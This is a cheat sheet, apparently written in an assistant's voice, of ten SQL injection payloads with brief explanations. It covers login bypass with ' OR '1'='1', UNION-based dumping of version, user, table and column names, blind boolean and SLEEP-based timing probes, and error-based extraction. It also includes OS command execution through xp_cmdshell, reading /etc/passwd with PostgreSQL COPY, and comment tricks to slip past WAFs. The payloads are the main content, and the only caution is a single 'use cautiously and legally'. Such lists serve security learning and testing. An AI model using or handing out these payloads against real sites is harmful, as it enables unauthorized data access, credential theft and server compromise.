Here are more SQL Injection payloads with detailed explanations, categorized by technique and purpose. This can help you better understand how and why each payload works.


---

1. Basic Authentication Bypass

Payload:

' OR '1'='1' --

Explanation:

' OR '1'='1' always evaluates to true.

-- comments out the rest of the SQL query.

Effective on login forms like:

SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''



---

2. Union-Based Injection

Payload:

' UNION SELECT null, version(), user() --

Explanation:

Combines result sets using UNION.

version() returns the DB version, user() returns current DB user.

null placeholders match the column count.

Used in pages that reflect query output (like search or profile).



---

3. Information Schema Discovery (MySQL)

Payload:

' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --

Explanation:

Extracts table names from the current database.

information_schema.tables is a metadata table.

table_schema=database() filters for the current DB only.



---

4. Blind Boolean-Based

Payloads:

' AND 1=1 --   → returns true (page loads normally)
' AND 1=2 --   → returns false (different behavior)

Explanation:

No visible data returned, but application behavior changes.

Useful when you can't see query results but can infer logic from response differences.



---

5. Time-Based Blind (MySQL)

Payload:

' OR IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) --

Explanation:

If condition is true (DB version starts with '5'), server pauses for 5 seconds.

Confirms conditions based on server response delay.

Used when there’s no visual feedback.



---

6. Error-Based Extraction (MySQL)

Payload:

' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) --

Explanation:

Triggers a duplicate key error by forcing a GROUP BY with non-unique values.

Error message will include the CONCAT() output (e.g., DB name).

Works when error messages are exposed.



---

7. Extracting Column Names

Payload:

' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --

Explanation:

Enumerates column names from the users table.



---

8. MSSQL Stacked Queries

Payload:

'; EXEC xp_cmdshell('whoami'); --

Explanation:

Runs OS commands on vulnerable MSSQL servers (if xp_cmdshell is enabled).

Use cautiously and legally.



---

9. PostgreSQL Read File Example

Payload:

'; COPY users FROM '/etc/passwd'; --

Explanation:

Reads a file into a table (if permissions allow).



---

10. Bypassing Filters

Payload:

'/**/OR/**/1=1--
' OR 1=1 LIMIT 1 OFFSET 1 --

Explanation:

Uses comments (/**/) to evade WAFs.

LIMIT/OFFSET for pagination attacks or avoiding duplicates.



---



